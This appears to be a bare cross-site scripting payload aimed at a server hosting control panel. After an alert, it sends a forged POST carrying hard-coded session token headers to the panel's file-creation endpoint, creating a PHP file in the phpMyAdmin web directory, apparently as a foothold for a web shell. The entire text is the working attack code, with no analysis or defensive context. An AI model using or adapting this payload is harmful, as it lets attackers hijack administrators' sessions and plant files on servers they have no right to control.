alert("aaa");
var xhr = new XMLHttpRequest();
xhr.open('POST', '/files?action=CreateFile', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;");
xhr.setRequestHeader("x-cookie-token", "zemi3DLjrmtMxmFlsFxK12Yqk4pHp17sW5c4zBczdehjVFOL");
xhr.setRequestHeader("x-http-token", "g5GSDV66sEFCZJi7Ss1yhNEk3tBpOoGcgOodFkC4NxOv06K5");
xhr.onload = function (e) {if (this.status == 200 || this.status == 304) {}};
xhr.send("path=/www/server/phpmyadmin/a.php");
